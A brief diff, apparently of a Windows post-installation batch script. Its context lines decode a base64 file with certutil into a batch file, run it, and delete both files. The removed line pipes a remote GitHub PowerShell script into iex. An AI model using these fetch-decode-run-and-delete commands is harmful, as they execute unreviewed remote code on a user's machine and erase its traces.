@@ -2,5 +2,3 @@ powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12'; (New
 cmd -c certutil -f -decode %temp%\temp.b64 %temp%\decoded.bat
 cmd -c call %temp%\decoded.bat 
 cmd -c del %temp%\temp.b64 %temp%\decoded.bat
-
-irm https://github.com/mastercodeon31415/Windows11-PostInstallationScripts/raw/refs/heads/main/hwid.ps1 | iex
